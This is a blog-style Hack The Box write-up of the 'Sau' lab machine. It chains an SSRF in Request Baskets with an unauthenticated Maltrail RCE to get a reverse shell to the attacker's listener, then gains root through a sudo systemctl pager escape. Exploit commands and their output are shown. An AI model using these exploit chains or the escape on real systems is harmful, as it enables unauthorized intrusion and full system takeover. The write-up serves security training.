<!DOCTYPE html> <html lang="en"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title>Sau | emdeh</title> <meta name="author" content=" "> <meta name="description" content="Sau - Hack The Box write-up."> <meta name="keywords" content="cybersecurity, ai, technology cyber"> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link defer rel="stylesheet" href="https://unpkg.com/bootstrap-table@1.22.1/dist/bootstrap-table.min.css"> <link rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons"> <link rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?19f3075a2d19613090fe9e16b564e1fe" media="" id="highlight_theme_light"> <link rel="shortcut icon" href="data:image/svg+xml,&lt;svg%20xmlns=%22http://www.w3.org/2000/svg%22%20viewBox=%220%200%20100%20100%22&gt;&lt;text%20y=%22.9em%22%20font-size=%2290%22&gt;%E2%9A%9B%EF%B8%8F&lt;/text&gt;&lt;/svg&gt;"> <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="canonical" href="https://emdeh.github.io/blog/2023/Sau/"> <link rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?e74e74bf055e5729d44a7d031a5ca6a5" media="none" id="highlight_theme_dark"> <script src="/assets/js/theme.js?96d6b3e1c3604aca8b6134c7afdd5db6"></script> <script src="/assets/js/dark_mode.js?9b17307bb950ffa2e34be0227f53558f"></script> <script async src="https://www.googletagmanager.com/gtag/js?id=G-JZNPNDMG9P"></script> <script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","G-JZNPNDMG9P");</script> </head> <body class="fixed-top-nav "> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/">emdeh</a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">about</a> </li> <li class="nav-item active"> <a class="nav-link" href="/blog/">blog<span class="sr-only">(current)</span></a> </li> <li class="nav-item "> <a class="nav-link" href="/essential-eight-explainers/">Essential Eight</a> </li> <li class="nav-item "> <a class="nav-link" href="/repositories/">repositories</a> </li> <li class="nav-item dropdown "> <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">submenus</a> <div class="dropdown-menu dropdown-menu-right" aria-labelledby="navbarDropdown"> <a class="dropdown-item" href="/blog/category/htb-machines">HTB-Machines</a> <div class="dropdown-divider"></div> <a class="dropdown-item" href="/essential-eight-explainers/">Essential Eight</a> <div class="dropdown-divider"></div> <a class="dropdown-item" href="/blog/category/explainers/">Explainers</a> </div> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="fas fa-moon"></i> <i class="fas fa-sun"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5"> <div class="post"> <header class="post-header"> <h1 class="post-title">Sau</h1> <p class="post-meta">October 16, 2023</p> <p class="post-tags"> <a href="/blog/2023"> <i class="fas fa-calendar fa-sm"></i> 2023 </a>   ·   <a href="/blog/tag/easy-box"> <i class="fas fa-hashtag fa-sm"></i> easy-box</a>   <a href="/blog/tag/htb"> <i class="fas fa-hashtag fa-sm"></i> HTB</a>   <a href="/blog/tag/ctf"> <i class="fas fa-hashtag fa-sm"></i> CTF</a>   <a href="/blog/tag/rce"> <i class="fas fa-hashtag fa-sm"></i> RCE</a>   <a href="/blog/tag/ssrf"> <i class="fas fa-hashtag fa-sm"></i> SSRF</a>     ·   <a href="/blog/category/htb-machines"> <i class="fas fa-tag fa-sm"></i> HTB-Machines</a>   </p> </header> <article class="post-content"> <div id="table-of-contents"> <ul id="toc" class="section-nav"> <li class="toc-entry toc-h1"><a href="#introduction">Introduction</a></li> <li class="toc-entry toc-h1"> <a href="#enumeration">Enumeration</a> <ul> <li class="toc-entry toc-h2"><a href="#whats-request-baskets">What’s Request Baskets?</a></li> <li class="toc-entry toc-h2"><a href="#whats-ssrf">What’s SSRF?</a></li> </ul> </li> <li class="toc-entry toc-h1"> <a href="#attack-vector">Attack vector</a> <ul> <li class="toc-entry toc-h2"><a href="#testing">Testing</a></li> </ul> </li> <li class="toc-entry toc-h1"><a href="#initial-access">Initial access</a></li> <li class="toc-entry toc-h1"><a href="#privilege-escalation">Privilege escalation</a></li> </ul> </div> <hr> <div id="markdown-content"> <h1 id="introduction">Introduction</h1> <p>Sau is an Easy machine on Hack The Box that focuses on exploiting two vulnerabilities to ultimately obtain initial access. Privilege escalation is then achieved by exploiting a legitimate binary.</p> <h1 id="enumeration">Enumeration</h1> <p>Nmap reveals three ports:</p> <ul> <li>22</li> <li>80</li> <li>55555</li> </ul> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code> nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-T4</span> 10.129.82.3 <span class="nt">-oA</span> nmap-sau
 
Not shown: 997 closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed <span class="o">(</span>RSA<span class="o">)</span>
|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp    filtered http
55555/tcp open     unknown
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
|     X-Content-Type-Options: nosniff
|     Date: Sun, 15 Oct 2023 04:01:09 GMT
|     Content-Length: 75
|     invalid basket name<span class="p">;</span> the name does not match pattern: ^[wd-_<span class="se">\.</span><span class="o">]{</span>1,250<span class="o">}</span><span class="err">$</span>
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 302 Found
|     Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
|     Location: /web
|     Date: Sun, 15 Oct 2023 04:00:37 GMT
|     Content-Length: 27
|     <span class="nv">href</span><span class="o">=</span><span class="s2">"/web"</span><span class="o">&gt;</span>Found&lt;/a&gt;.
|   HTTPOptions:
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Sun, 15 Oct 2023 04:00:38 GMT
|_    Content-Length: 0
&lt;SNIP&gt;
</code></pre></div></div> <p>SSH is a dead end and port 80 is filtered, but browsing to <code class="language-plaintext highlighter-rouge">http://10.129.82.3:55555</code> lands on a site titled <strong>Request Baskets</strong>.</p> <h2 id="whats-request-baskets">What’s Request Baskets?</h2> <p>Request Baskets is a concept, often implemented as a tool or a service, used to capture, inspect, and debug HTTP requests. It provides a temporary “basket” or “bucket” that captures incoming HTTP requests for analysis. This is particularly useful for debugging webhooks, HTTP clients, or other services that send HTTP requests.</p> <p>An implementation usually works like this:</p> <ol> <li> <strong>Create</strong> a new Request Basket, which provides a unique URL endpoint.</li> <li> <strong>Configure</strong> the application, webhook, or service to send HTTP requests to the URL.</li> <li> <strong>Inspect</strong> the incoming HTTP requests to the basket</li> <li>Use the captured information, to <strong>test or debug issues</strong>, validate payloads, or run other types of tests.</li> </ol> <p>We can see that this particular implementation is on version 1.2.1, which is vulnerable to <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-27163" rel="external nofollow noopener" target="_blank"> <em>CVE-2023–27163 - a Server-Side Request Forgery (SSRF)</em></a></p> <h2 id="whats-ssrf">What’s SSRF?</h2> <p>SSRF, or Server-Side Request Forgery, is a security vulnerability that allows an attacker to make requests to internal resources within an organization’s network, effectively bypassing firewalls. In SSRF attacks, <strong><em>the attacker manipulates a vulnerable web application to make requests to an internal resource,</em></strong> which could be anything from cloud services to databases or even restricted parts of the web application itself.</p> <p>The attack often occurs when a web application doesn’t properly validate or sanitise user input for URLs. An attacker can then trick the server into making an unauthorised request to internal resources, potentially revealing sensitive information or even executing commands.</p> <p>It’s particularly concerning in cloud environments, where metadata APIs can expose sensitive data that can lead to more severe attacks like privilege escalation.</p> <p>Prevention often involves input validation, restricting outbound requests from the server, or implementing allow lists for permissible URLs.</p> <h1 id="attack-vector">Attack vector</h1> <p>Given port 80 is filtered but there is an implementation of Request Baskets on port 55555 that is vulnerable to SSRF, this appears to provide a way to forward requests to the service running on port 80. A PoC of the SSRF vulnerability on Request-Baskets can be found <a href="https://github.com/entr0pie/CVE-2023-27163" rel="external nofollow noopener" target="_blank">here</a>.</p> <h2 id="testing">Testing</h2> <p>Creating a new basket in the web app and then configuring port 80 as the forward URL on a local interface can confirm this.</p> <p>Hovering over the <code class="language-plaintext highlighter-rouge">Proxy Response</code> option, we can see it will <em>Proxy the response from the forward url back to the client</em>.</p> <p>Checking this option will return the response from <code class="language-plaintext highlighter-rouge">http://localhost:80</code>.</p> <p><img src="/assets/img/2023-sau/20231016-sau-2.png" class="auto-resize"></p> <p>Triggering a request by browsing to <code class="language-plaintext highlighter-rouge">http://10.129.82.3:55555/wnnyr21</code> returns a seemingly malformed web app called <strong>Maltrail</strong>. <img src="/assets/img/2023-sau/20231016-sau-5.png" class="auto-resize"></p> <p>The app is running version 0.53 which is vulnerable to a <strong>Remote Code Execution.</strong></p> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~]
└─<span class="nv">$ </span>searchsploit maltrail
<span class="nt">-----------------------------------------------------</span> <span class="nt">---------------------------------</span>
 Exploit Title                                       |  Path
<span class="nt">-----------------------------------------------------</span> <span class="nt">---------------------------------</span>
Maltrail v0.53 - Unauthenticated Remote Code Executi | python/webapps/51676.py
</code></pre></div></div> <h1 id="initial-access">Initial access</h1> <p>Using the first exploit, a basket can be created that, when accessed, will make a request to <code class="language-plaintext highlighter-rouge">http://localhost:80</code>, as tested manually.</p> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/HTB-Machines/sau/exploits]
└─<span class="nv">$ </span>./CVE-2023-27163.sh http://10.129.82.3:55555/ http://localhost:80
Proof-of-Concept of SSRF on Request-Baskets <span class="o">(</span>CVE-2023-27163<span class="o">)</span> <span class="o">||</span> More info at https://github.com/entr0pie/CVE-2023-27163

<span class="o">&gt;</span> Creating the <span class="s2">"ndapra"</span> proxy basket...
<span class="o">&gt;</span> Basket created!
<span class="o">&gt;</span> Accessing http://10.129.82.3:55555/ndapra now makes the server request to http://localhost:80.
./CVE-2023-27163.sh: line 43: jq: <span class="nb">command </span>not found
<span class="o">&gt;</span> Response body <span class="o">(</span>Authorization<span class="o">)</span>: <span class="o">{</span><span class="s2">"token"</span>:<span class="s2">"uQW06XHLrVKiZsq2XbeXRbrb6PRlQ53tTAVeaA-Puolb"</span><span class="o">}</span>
</code></pre></div></div> <p>This basket can then be used to proxy the second exploit to the vulnerable implementation of Maltrail.</p> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/HTB-Machines/sau/exploits]
└─<span class="nv">$ </span>python3 51676.py 10.10.14.12 4321  http://10.129.82.3:55555/ndapra
Running exploit on http://10.129.82.3:55555/ndapra/login
</code></pre></div></div> <p>The payload is executed on the Maltrail instance running on port 80, and a reverse shell is sucessfully caught on the listener.</p> <p><img src="/assets/img/2023-sau/20231016-sau-3.png" class="auto-resize"></p> <h1 id="privilege-escalation">Privilege escalation</h1> <p>Privilege escalation is reasonably straight forward.</p> <p>Checking what the user can run as sudo returns one binary: <code class="language-plaintext highlighter-rouge">/usr/bin/systemctl status trail.service</code></p> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>puma on sau:
    env_reset, mail_badpass,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User puma may run the following commands on sau:
    <span class="o">(</span>ALL : ALL<span class="o">)</span> NOPASSWD: /usr/bin/systemctl status trail.service
</code></pre></div></div> <p><a href="https://gtfobins.github.io/gtfobins/systemctl/" rel="external nofollow noopener" target="_blank">GTFOBIns</a> says the following about <code class="language-plaintext highlighter-rouge">systemctl</code> ran as sudo:</p> <blockquote> <p><em>If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor.</em></p> </blockquote> <p>Running the binary seems to drop into a new terminal session:</p> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/systemctl status trail.service
<span class="nb">sudo</span> /usr/bin/systemctl status trail.service
WARNING: terminal is not fully functional
-  <span class="o">(</span>press RETURN<span class="o">)</span>
</code></pre></div></div> <p>Attempting to execute a new shell from this terminal will spawn it under sudo:</p> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/systemctl status trail.service
<span class="nb">sudo</span> /usr/bin/systemctl status trail.service
WARNING: terminal is not fully functional
-  <span class="o">(</span>press RETURN<span class="o">)!</span>/bin/sh
<span class="o">!</span>//bbiinn//sshh!/bin/sh
<span class="c"># whoami</span>
<span class="nb">whoami
</span>root
</code></pre></div></div> <p><img src="/assets/img/2023-sau/20231016-sau-4.png" class="auto-resize"></p> <p>Done and dusted!</p> </div> </article> <br> <hr> <br> <ul class="list-disc pl-8"></ul> <h2 class="text-3xl font-semibold mb-4 mt-12">Enjoy Reading This Article?</h2> <p class="mb-2">Here are some more articles you might like to read next:</p> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2023/pilgrimage-write-up/">Pilgrimage</a> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2023/Essential-Eight/">Essential Eight Explainers</a> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2023/cyber-kill-chain/">Human Disruption - Breaking the Cyber Kill Chain</a> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2023/socks/">SOCKS4 vs SOCKS5</a> </li> </div> </div> <footer class="fixed-bottom"> <div class="container mt-0"> © Copyright 2023 . Powered by <a href="https://jekyllrb.com/" target="_blank" rel="external nofollow noopener">Jekyll</a> with <a href="https://github.com/alshedivat/al-folio" rel="external nofollow noopener" target="_blank">al-folio</a> theme. Hosted by <a href="https://pages.github.com/" target="_blank" rel="external nofollow noopener">GitHub Pages</a>. </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@4/imagesloaded.pkgd.min.js"></script> <script defer src="/assets/js/masonry.js" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.0.8/dist/medium-zoom.min.js" integrity="sha256-7PhEpEWEW0XXQ0k6kQrPKwuoIomz8R8IYyuU1Qew4P8=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?7b30caa5023af4af8408a472dc4e1ebb"></script> <script defer src="https://unpkg.com/bootstrap-table@1.22.1/dist/bootstrap-table.min.js"></script> <script src="/assets/js/no_defer.js?d633890033921b33e0ceb13d22340a9c"></script> <script defer src="/assets/js/common.js?acdb9690d7641b2f8d40529018c71a01"></script> <script defer src="/assets/js/copy_code.js?c9d9dd48933de3831b3ee5ec9c209cac" type="text/javascript"></script> <script async src="https://d1bxh8uas1mnw7.cloudfront.net/assets/embed.js"></script> <script async src="https://badge.dimensions.ai/badge.js"></script> <script type="text/javascript">window.MathJax={tex:{tags:"ams"}};</script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js"></script> <script defer src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script async src="https://www.googletagmanager.com/gtag/js?id=G-JZNPNDMG9P"></script> <script>function gtag(){window.dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","G-JZNPNDMG9P");</script> <script type="text/javascript">function progressBarSetup(){"max"in document.createElement("progress")?(initializeProgressElement(),$(document).on("scroll",function(){progressBar.attr({value:getCurrentScrollPosition()})}),$(window).on("resize",initializeProgressElement)):(resizeProgressBar(),$(document).on("scroll",resizeProgressBar),$(window).on("resize",resizeProgressBar))}function getCurrentScrollPosition(){return $(window).scrollTop()}function initializeProgressElement(){let e=$("#navbar").outerHeight(!0);$("body").css({"padding-top":e}),$("progress-container").css({"padding-top":e}),progressBar.css({top:e}),progressBar.attr({max:getDistanceToScroll(),value:getCurrentScrollPosition()})}function getDistanceToScroll(){return $(document).height()-$(window).height()}function resizeProgressBar(){progressBar.css({width:getWidthPercentage()+"%"})}function getWidthPercentage(){return getCurrentScrollPosition()/getDistanceToScroll()*100}const progressBar=$("#progress");window.onload=function(){setTimeout(progressBarSetup,50)};</script> </body> </html>